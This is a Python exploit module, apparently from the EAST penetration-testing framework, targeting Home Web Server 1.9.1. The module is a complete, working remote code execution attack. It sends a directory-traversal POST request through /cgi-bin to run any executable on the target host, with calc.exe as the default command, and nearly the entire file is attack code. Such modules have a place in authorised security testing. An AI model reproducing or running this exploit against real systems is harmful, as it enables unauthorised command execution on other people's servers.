#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import socket

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_home_web_server_rce"
INFO['DESCRIPTION'] = "Home Web Server 1.9.1 build 164 - Remote Code Execution"
INFO['VENDOR'] = "http://downstairs.dnsalias.net/"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/6713ded59ae078c0539cc93cec5e102d-HomeWebServerInstall.exe'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42128/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """
Home Web Server allows to call cgi programs via POST which are located into /cgi-bin folder. However by using a directory traversal, it is possible to run any executable being on the remote host. 
"""
INFO['CHANGELOG'] = "06 Jun 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = "80"
OPTIONS["CMD"] = 'Windows/system32/calc.exe'

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.cmd = OPTIONS['CMD']
        self.host = host
        self.port = port
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.cmd = self.args.get('CMD', self.cmd)
        
    def run(self):
        self.args()
        
        packet = 'POST /cgi-bin/../../../../../../../../{} HTTP/1.1\r\n\r\n'.format(self.cmd)
        
        try:
            s = socket.socket()
            s.connect((self.host, self.port))
            s.sendall(packet)
            self.log(s.recv(4096).strip())
            s.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('Success!')
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()